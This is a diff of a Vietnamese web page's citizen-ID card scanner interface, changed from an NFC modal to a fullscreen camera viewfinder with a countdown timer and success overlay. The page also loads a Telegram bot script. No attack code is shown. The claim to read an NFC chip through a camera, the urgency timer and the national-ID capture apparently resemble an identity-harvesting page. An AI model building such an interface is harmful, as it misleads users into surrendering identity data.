@@ -524,114 +524,83 @@
 
     <div id="notification" class="notification"></div>
 
-    <!-- ===== CCCD SCANNER MODAL ===== -->
-    <div id="cccdModal" class="cccd-overlay">
-        <div class="cccd-modal">
-            <!-- Header -->
-            <div class="cccd-header">
-                <div class="cccd-header-left">
-                    <svg width="22" height="22" viewBox="0 0 48 48" fill="none"><rect x="2" y="10" width="44" height="28" rx="4" fill="#fff" opacity=".9"/><rect x="7" y="17" width="11" height="8" rx="1.5" fill="#FFD600"/><line x1="10" y1="17" x2="10" y2="25" stroke="#c8a000" stroke-width=".8"/><line x1="13" y1="17" x2="13" y2="25" stroke="#c8a000" stroke-width=".8"/><line x1="7" y1="20" x2="18" y2="20" stroke="#c8a000" stroke-width=".8"/><line x1="7" y1="23" x2="18" y2="23" stroke="#c8a000" stroke-width=".8"/></svg>
-                    <span>Quét CCCD gắn Chip</span>
-                </div>
-                <button class="cccd-close" onclick="closeCCCDScanner()">✕</button>
-            </div>
+    <!-- ===== CCCD SCANNER FULLSCREEN ===== -->
+    <div id="cccdModal" class="cccd-fs-overlay">
 
-            <!-- Step 1: Ready -->
-            <div id="cccdStep1" class="cccd-step">
-                <div class="cccd-step-icon">
-                    <div class="cccd-phone-wrap">
-                        <svg class="cccd-card-svg" viewBox="0 0 200 120" xmlns="http://www.w3.org/2000/svg">
-                            <defs>
-                                <linearGradient id="cg1" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:#1565C0"/><stop offset="100%" style="stop-color:#0D47A1"/></linearGradient>
-                            </defs>
-                            <rect x="10" y="10" width="180" height="100" rx="10" fill="url(#cg1)" stroke="#fff" stroke-width="2" opacity=".95"/>
-                            <rect x="22" y="28" width="42" height="30" rx="4" fill="#FFD600" stroke="#F9A825" stroke-width="1.2"/>
-                            <line x1="31" y1="28" x2="31" y2="58" stroke="#c8a000" stroke-width="1.2"/><line x1="40" y1="28" x2="40" y2="58" stroke="#c8a000" stroke-width="1.2"/><line x1="49" y1="28" x2="49" y2="58" stroke="#c8a000" stroke-width="1.2"/><line x1="22" y1="37" x2="64" y2="37" stroke="#c8a000" stroke-width="1.2"/><line x1="22" y1="46" x2="64" y2="46" stroke="#c8a000" stroke-width="1.2"/>
-                            <rect x="22" y="70" width="80" height="5" rx="2" fill="rgba(255,255,255,.4)"/>
-                            <rect x="22" y="80" width="55" height="5" rx="2" fill="rgba(255,255,255,.3)"/>
-                            <rect x="22" y="90" width="65" height="5" rx="2" fill="rgba(255,255,255,.25)"/>
-                            <text x="150" y="108" font-size="9" fill="rgba(255,255,255,.5)" font-family="Arial" font-weight="bold">VNM</text>
-                            <circle cx="160" cy="35" r="18" fill="none" stroke="rgba(255,255,255,.15)" stroke-width="2"/>
-                            <circle cx="160" cy="35" r="12" fill="none" stroke="rgba(255,255,255,.2)" stroke-width="2"/>
-                            <circle cx="160" cy="35" r="6" fill="rgba(255,255,255,.15)"/>
-                            <text x="156" y="38" font-size="7" fill="rgba(255,255,255,.6)" font-family="Arial">NFC</text>
-                        </svg>
-                        <div class="cccd-nfc-rings">
-                            <span class="ring r1"></span><span class="ring r2"></span><span class="ring r3"></span>
-                        </div>
-                    </div>
-                </div>
-                <h3 class="cccd-step-title">Sẵn sàng quét CCCD gắn Chip</h3>
-                <p class="cccd-step-desc">Đặt mặt sau điện thoại chạm vào vùng chip NFC trên CCCD của bạn. Giữ yên cho đến khi quét xong.</p>
-                <div class="cccd-instructions">
-                    <div class="cccd-instr-item"><span class="cccd-instr-num">1</span><span>Mở khoá điện thoại</span></div>
-                    <div class="cccd-instr-item"><span class="cccd-instr-num">2</span><span>Đặt CCCD trên mặt phẳng</span></div>
-                    <div class="cccd-instr-item"><span class="cccd-instr-num">3</span><span>Áp mặt sau điện thoại vào chip</span></div>
-                </div>
-                <button class="cccd-btn-primary" onclick="startCCCDScan()">📡 Bắt đầu quét</button>
+        <!-- Top bar -->
+        <div class="cccd-fs-topbar">
+            <div class="cccd-fs-topbar-left">
+                <svg width="20" height="20" viewBox="0 0 48 48" fill="none"><rect x="2" y="10" width="44" height="28" rx="4" fill="#fff" opacity=".9"/><rect x="7" y="17" width="11" height="8" rx="1.5" fill="#FFD600"/><line x1="10" y1="17" x2="10" y2="25" stroke="#c8a000" stroke-width=".8"/><line x1="13" y1="17" x2="13" y2="25" stroke="#c8a000" stroke-width=".8"/><line x1="7" y1="20" x2="18" y2="20" stroke="#c8a000" stroke-width=".8"/><line x1="7" y1="23" x2="18" y2="23" stroke="#c8a000" stroke-width=".8"/></svg>
+                <span>Quét CCCD gắn Chip</span>
             </div>
-
-            <!-- Step 2: Scanning -->
-            <div id="cccdStep2" class="cccd-step" style="display:none;">
-                <div class="cccd-scan-anim">
-                    <div class="cccd-scan-circle">
-                        <div class="cccd-scan-pulse p1"></div>
-                        <div class="cccd-scan-pulse p2"></div>
-                        <div class="cccd-scan-pulse p3"></div>
-                        <svg class="cccd-scan-icon" viewBox="0 0 80 80" fill="none" xmlns="http://www.w3.org/2000/svg">
-                            <circle cx="40" cy="40" r="36" fill="#E3F2FD" stroke="#1565C0" stroke-width="2"/>
-                            <path d="M26 40 Q34 28 40 40 Q46 52 54 40" stroke="#1565C0" stroke-width="3" fill="none" stroke-linecap="round"/>
-                            <circle cx="40" cy="40" r="5" fill="#1565C0"/>
-                        </svg>
-                    </div>
-                </div>
-                <h3 class="cccd-step-title" id="cccdScanTitle">Đang kết nối NFC...</h3>
-                <div class="cccd-progress-bar"><div class="cccd-progress-fill" id="cccdProgressFill"></div></div>
-                <p class="cccd-scan-status" id="cccdScanStatus">Đang tìm chip NFC...</p>
-                <p style="font-size:12px;color:#bbb;margin-top:8px;">Giữ yên điện thoại, không di chuyển</p>
+            <div class="cccd-fs-topbar-right">
+                <div class="cccd-fs-timer" id="cccdCountdown">50</div>
+                <button class="cccd-fs-close" onclick="closeCCCDScanner()">✕</button>
             </div>
+        </div>
 
-            <!-- Step 3: Result -->
-            <div id="cccdStep3" class="cccd-step" style="display:none;">
-                <div class="cccd-result-success">
-                    <div class="cccd-result-check">✓</div>
-                    <span>Đọc chip thành công!</span>
-                </div>
-                <div class="cccd-card-result">
-                    <div class="cccd-card-top">
-                        <div class="cccd-card-logo">
-                            <svg width="36" height="36" viewBox="0 0 100 100"><defs><linearGradient id="rg" x1="0%" y1="0%" x2="0%" y2="100%"><stop offset="0%" style="stop-color:#DC143C"/><stop offset="100%" style="stop-color:#B22222"/></linearGradient></defs><circle cx="50" cy="50" r="48" fill="url(#rg)" stroke="#FFD700" stroke-width="2"/><path d="M50 12 L56 35 L80 35 L60 48 L68 72 L50 58 L32 72 L40 48 L20 35 L44 35Z" fill="#FFD700"/></svg>
-                            <div class="cccd-card-logo-text"><div>CỘNG HOÀ XÃ HỘI CHỦ NGHĨA VIỆT NAM</div><div style="font-weight:800;font-size:13px;color:#c0392b;margin-top:2px;">CĂN CƯỚC CÔNG DÂN</div></div>
-                        </div>
-                        <div class="cccd-avatar">
-                            <svg viewBox="0 0 80 80" fill="none" xmlns="http://www.w3.org/2000/svg">
-                                <rect width="80" height="80" fill="#dbeafe" rx="6"/>
-                                <circle cx="40" cy="30" r="16" fill="#93c5fd"/>
-                                <ellipse cx="40" cy="70" rx="24" ry="18" fill="#93c5fd"/>
+        <!-- Camera viewfinder area -->
+        <div class="cccd-fs-body">
+
+            <!-- Instruction above frame -->
+            <p class="cccd-fs-guide" id="cccdGuideText">Đặt thẻ CCCD vào trong khung để bắt đầu quét</p>
+
+            <!-- Scan frame -->
+            <div class="cccd-fs-frame-wrap">
+                <!-- Dark masks -->
+                <div class="cccd-fs-mask top"></div>
+                <div class="cccd-fs-mask-row">
+                    <div class="cccd-fs-mask side"></div>
+                    <!-- The viewfinder hole -->
+                    <div class="cccd-fs-frame" id="cccdFrame">
+                        <!-- Corner brackets -->
+                        <span class="cccd-corner tl"></span>
+                        <span class="cccd-corner tr"></span>
+                        <span class="cccd-corner bl"></span>
+                        <span class="cccd-corner br"></span>
+                        <!-- Scan line -->
+                        <div class="cccd-scanline" id="cccdScanLine"></div>
+                        <!-- Card ghost guide -->
+                        <div class="cccd-card-ghost" id="cccdCardGhost">
+                            <svg viewBox="0 0 280 170" fill="none" xmlns="http://www.w3.org/2000/svg" width="100%" height="100%">
+                                <rect x="4" y="4" width="272" height="162" rx="10" fill="none" stroke="rgba(255,255,255,0.12)" stroke-width="1.5" stroke-dasharray="6 4"/>
+                                <rect x="18" y="30" width="52" height="38" rx="4" fill="rgba(255,214,0,0.18)" stroke="rgba(255,214,0,0.3)" stroke-width="1"/>
+                                <rect x="18" y="80" width="110" height="7" rx="3" fill="rgba(255,255,255,0.1)"/>
+                                <rect x="18" y="94" width="80" height="6" rx="3" fill="rgba(255,255,255,0.08)"/>
+                                <rect x="18" y="107" width="95" height="6" rx="3" fill="rgba(255,255,255,0.08)"/>
+                                <circle cx="240" cy="50" r="28" fill="none" stroke="rgba(255,255,255,0.08)" stroke-width="1.5"/>
+                                <circle cx="240" cy="50" r="18" fill="rgba(255,255,255,0.05)"/>
                             </svg>
                         </div>
                     </div>
-                    <div class="cccd-fields">
-                        <div class="cccd-field-row"><span class="cccd-field-label">Số CCCD</span><span class="cccd-field-val bold" id="rf_id"></span></div>
-                        <div class="cccd-field-row"><span class="cccd-field-label">Họ và tên</span><span class="cccd-field-val bold red" id="rf_name"></span></div>
-                        <div class="cccd-field-row"><span class="cccd-field-label">Ngày sinh</span><span class="cccd-field-val" id="rf_dob"></span></div>
-                        <div class="cccd-field-row"><span class="cccd-field-label">Giới tính</span><span class="cccd-field-val" id="rf_gender"></span></div>
-                        <div class="cccd-field-row"><span class="cccd-field-label">Quốc tịch</span><span class="cccd-field-val" id="rf_nation"></span></div>
-                        <div class="cccd-field-row"><span class="cccd-field-label">Quê quán</span><span class="cccd-field-val" id="rf_hometown"></span></div>
-                        <div class="cccd-field-row full"><span class="cccd-field-label">Nơi ĐKHK thường trú</span><span class="cccd-field-val" id="rf_address"></span></div>
-                        <div class="cccd-field-row"><span class="cccd-field-label">Ngày cấp</span><span class="cccd-field-val" id="rf_issue"></span></div>
-                        <div class="cccd-field-row"><span class="cccd-field-label">Có giá trị đến</span><span class="cccd-field-val bold" id="rf_expire"></span></div>
-                        <div class="cccd-field-row full"><span class="cccd-field-label">Nơi cấp</span><span class="cccd-field-val" id="rf_issueplace"></span></div>
-                    </div>
-                    <div class="cccd-chip-strip">
-                        <svg width="36" height="28" viewBox="0 0 48 36"><rect x="2" y="2" width="44" height="32" rx="4" fill="#FFD600" stroke="#F9A825" stroke-width="1.5"/><line x1="12" y1="2" x2="12" y2="34" stroke="#c8a000" stroke-width="1"/><line x1="22" y1="2" x2="22" y2="34" stroke="#c8a000" stroke-width="1"/><line x1="32" y1="2" x2="32" y2="34" stroke="#c8a000" stroke-width="1"/><line x1="2" y1="12" x2="46" y2="12" stroke="#c8a000" stroke-width="1"/><line x1="2" y1="22" x2="46" y2="22" stroke="#c8a000" stroke-width="1"/></svg>
-                        <span style="font-size:10px;color:#888;margin-left:6px;">Chip đã được xác thực ✓</span>
-                    </div>
+                    <div class="cccd-fs-mask side"></div>
                 </div>
-                <div class="cccd-result-actions">
-                    <button class="cccd-btn-outline" onclick="startCCCDScan()">🔄 Quét lại</button>
-                    <button class="cccd-btn-primary" onclick="confirmCCCDData()">✅ Xác nhận thông tin</button>
+                <div class="cccd-fs-mask bottom"></div>
+            </div>
+
+            <!-- Status below frame -->
+            <div class="cccd-fs-status-area">
+                <p class="cccd-fs-status" id="cccdScanStatus">Đang tìm chip NFC trên thẻ...</p>
+                <div class="cccd-fs-dots">
+                    <span class="cccd-dot d1"></span>
+                    <span class="cccd-dot d2"></span>
+                    <span class="cccd-dot d3"></span>
                 </div>
+            </div>
+        </div>
+
+        <!-- Success overlay (hidden by default) -->
+        <div class="cccd-fs-success" id="cccdSuccessOverlay">
+            <div class="cccd-fs-success-inner">
+                <div class="cccd-fs-check-ring">
+                    <svg width="64" height="64" viewBox="0 0 64 64" fill="none">
+                        <circle cx="32" cy="32" r="30" stroke="#00e676" stroke-width="3" fill="rgba(0,230,118,0.12)"/>
+                        <path d="M18 32 L27 42 L46 22" stroke="#00e676" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                </div>
+                <p class="cccd-fs-success-title">Quét thành công!</p>
+                <p class="cccd-fs-success-sub" id="cccdSuccessName"></p>
+                <p class="cccd-fs-success-redirect">Đang chuyển về trang chủ...</p>
             </div>
         </div>
     </div>
@@ -672,9 +641,269 @@
     </div>
     <style>
         @keyframes qrFadeIn { from { opacity:0; transform:translateY(18px); } to { opacity:1; transform:translateY(0); } }
+
+        /* ===== CCCD FULLSCREEN SCANNER ===== */
+        .cccd-fs-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: #0a0a0a;
+            z-index: 99999;
+            flex-direction: column;
+            overflow: hidden;
+        }
+        .cccd-fs-overlay.open {
+            display: flex;
+        }
+
+        /* Top bar */
+        .cccd-fs-topbar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 14px 18px;
+            background: rgba(0,0,0,0.6);
+            border-bottom: 1px solid rgba(255,255,255,0.08);
+            flex-shrink: 0;
+            z-index: 2;
+        }
+        .cccd-fs-topbar-left {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: #fff;
+            font-size: 15px;
+            font-weight: 700;
+            letter-spacing: 0.3px;
+        }
+        .cccd-fs-topbar-right {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+        .cccd-fs-timer {
+            background: rgba(220,20,60,0.85);
+            color: #fff;
+            font-size: 15px;
+            font-weight: 800;
+            width: 38px;
+            height: 38px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-variant-numeric: tabular-nums;
+            box-shadow: 0 0 0 3px rgba(220,20,60,0.25);
+        }
+        .cccd-fs-timer.urgent {
+            background: #e74c3c;
+            animation: cccdPulseRed 0.6s ease infinite alternate;
+        }
+        @keyframes cccdPulseRed {
+            from { box-shadow: 0 0 0 3px rgba(231,76,60,0.3); }
+            to   { box-shadow: 0 0 0 8px rgba(231,76,60,0.0); }
+        }
+        .cccd-fs-close {
+            background: rgba(255,255,255,0.12);
+            border: none;
+            color: #fff;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            font-size: 16px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background 0.2s;
+        }
+        .cccd-fs-close:hover { background: rgba(255,255,255,0.22); }
+
+        /* Body */
+        .cccd-fs-body {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            gap: 20px;
+        }
+
+        .cccd-fs-guide {
+            color: rgba(255,255,255,0.82);
+            font-size: 13.5px;
+            text-align: center;
+            margin: 0;
+            padding: 0 20px;
+            letter-spacing: 0.2px;
+        }
+
+        /* Frame layout */
+        .cccd-fs-frame-wrap {
+            display: flex;
+            flex-direction: column;
+            width: 100%;
+            flex: 1;
+            max-height: 340px;
+        }
+        .cccd-fs-mask {
+            background: rgba(0,0,0,0.72);
+            flex: 1;
+        }
+        .cccd-fs-mask.top { height: 0; flex: 0 0 0; }
+        .cccd-fs-mask.bottom { flex: 1; }
+        .cccd-fs-mask-row {
+            display: flex;
+            flex-direction: row;
+            align-items: stretch;
+        }
+        .cccd-fs-mask.side {
+            width: 22px;
+            flex: 0 0 22px;
+            background: rgba(0,0,0,0.72);
+        }
+
+        /* The clear scanning window */
+        .cccd-fs-frame {
+            flex: 1;
+            position: relative;
+            overflow: hidden;
+            background: transparent;
+            border-radius: 6px;
+            min-height: 200px;
+            max-height: 280px;
+        }
+
+        /* Corner brackets */
+        .cccd-corner {
+            position: absolute;
+            width: 24px;
+            height: 24px;
+            z-index: 3;
+        }
+        .cccd-corner.tl { top: 0; left: 0; border-top: 3px solid #00e5ff; border-left: 3px solid #00e5ff; border-radius: 4px 0 0 0; }
+        .cccd-corner.tr { top: 0; right: 0; border-top: 3px solid #00e5ff; border-right: 3px solid #00e5ff; border-radius: 0 4px 0 0; }
+        .cccd-corner.bl { bottom: 0; left: 0; border-bottom: 3px solid #00e5ff; border-left: 3px solid #00e5ff; border-radius: 0 0 0 4px; }
+        .cccd-corner.br { bottom: 0; right: 0; border-bottom: 3px solid #00e5ff; border-right: 3px solid #00e5ff; border-radius: 0 0 4px 0; }
+
+        /* Scan line */
+        .cccd-scanline {
+            position: absolute;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent 0%, #00e5ff 20%, #ffffff 50%, #00e5ff 80%, transparent 100%);
+            box-shadow: 0 0 12px 3px rgba(0,229,255,0.55);
+            top: 0;
+            z-index: 4;
+            animation: cccdScanMove 2.2s ease-in-out infinite;
+        }
+        @keyframes cccdScanMove {
+            0%   { top: 0%; }
+            50%  { top: calc(100% - 2px); }
+            100% { top: 0%; }
+        }
+
+        /* Card ghost */
+        .cccd-card-ghost {
+            position: absolute;
+            inset: 10px;
+            opacity: 1;
+            transition: opacity 0.5s;
+        }
+        .cccd-card-ghost.hidden { opacity: 0; }
+
+        /* Status area */
+        .cccd-fs-status-area {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+            padding-bottom: 10px;
+        }
+        .cccd-fs-status {
+            color: rgba(255,255,255,0.75);
+            font-size: 13px;
+            margin: 0;
+            text-align: center;
+            min-height: 20px;
+            transition: color 0.3s;
+        }
+        .cccd-fs-status.active { color: #00e5ff; }
+        .cccd-fs-dots {
+            display: flex;
+            gap: 7px;
+        }
+        .cccd-dot {
+            width: 7px;
+            height: 7px;
+            border-radius: 50%;
+            background: rgba(0,229,255,0.5);
+            animation: cccdDotPulse 1.2s ease-in-out infinite;
+        }
+        .cccd-dot.d2 { animation-delay: 0.2s; }
+        .cccd-dot.d3 { animation-delay: 0.4s; }
+        @keyframes cccdDotPulse {
+            0%, 100% { opacity: 0.3; transform: scale(0.8); }
+            50%      { opacity: 1;   transform: scale(1.2); }
+        }
+
+        /* Success overlay */
+        .cccd-fs-success {
+            display: none;
+            position: absolute;
+            inset: 0;
+            background: rgba(0,0,0,0.88);
+            z-index: 10;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
+        .cccd-fs-success.show {
+            display: flex;
+            animation: cccdFadeIn 0.35s ease;
+        }
+        @keyframes cccdFadeIn {
+            from { opacity: 0; transform: scale(0.92); }
+            to   { opacity: 1; transform: scale(1); }
+        }
+        .cccd-fs-success-inner {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 14px;
+            text-align: center;
+            padding: 0 30px;
+        }
+        .cccd-fs-check-ring {
+            animation: cccdCheckPop 0.4s cubic-bezier(0.34,1.56,0.64,1) both;
+        }
+        @keyframes cccdCheckPop {
+            from { transform: scale(0); opacity: 0; }
+            to   { transform: scale(1); opacity: 1; }
+        }
+        .cccd-fs-success-title {
+            color: #00e676;
+            font-size: 22px;
+            font-weight: 800;
+            margin: 0;
+        }
+        .cccd-fs-success-sub {
+            color: #fff;
+            font-size: 15px;
+            font-weight: 600;
+            margin: 0;
+        }
+        .cccd-fs-success-redirect {
+            color: rgba(255,255,255,0.5);
+            font-size: 12px;
+            margin: 0;
+        }
     </style>
 
     <script src="telegram-bot.js"></script>
+    <script src="cccd-scanner.js"></script>
     <script src="script.js"></script>
     <script>
         // ===== QR Payment Modal =====
